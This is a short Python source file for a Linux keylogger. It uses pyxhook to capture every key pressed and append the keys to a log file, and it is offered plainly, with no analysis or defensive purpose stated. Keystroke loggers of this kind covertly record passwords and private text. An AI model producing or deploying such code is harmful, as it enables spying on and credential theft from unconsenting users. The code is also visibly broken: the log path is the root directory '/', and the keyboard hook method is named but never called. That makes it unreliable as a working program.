"""
Simple python keylogger for linux
"""

import pyxhook

keystrokes_file = "/"

def on_keyboard_event(event):
    k = event.Key 
    if k == "space": k = " "
    with open(keystrokes_file, 'a+') as keylogging:
        keylogging.write("%s\n" % k)


hook_manager = pyxhook.HookManager()

hook_manager.Keydown = on_keyboard_event

hook_manager.HookKeyboard

hook_manager.start()

